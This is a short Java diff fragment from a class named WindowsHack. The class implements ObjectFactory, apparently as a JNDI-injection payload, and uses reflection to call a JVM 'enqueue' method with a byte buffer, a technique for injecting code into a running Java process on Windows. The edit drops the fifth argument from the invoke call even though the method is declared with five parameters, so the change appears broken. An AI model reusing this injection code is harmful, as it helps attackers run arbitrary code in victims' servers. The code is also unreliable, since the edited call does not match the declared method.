@@ -38,7 +38,7 @@ public class WindowsHack extends ClassLoader implements ObjectFactory {
 
             Method enqueue = vm.getDeclaredMethod("enqueue", long.class, byte[].class, String.class, String.class, Object[].class);
             enqueue.setAccessible(true);
-            enqueue.invoke(null, -1, buf, "enqueue", "enqueue", null);
+            enqueue.invoke(null, -1, buf, "enqueue", "enqueue");
         } catch (Exception var13) {
             var13.printStackTrace();
             return null;
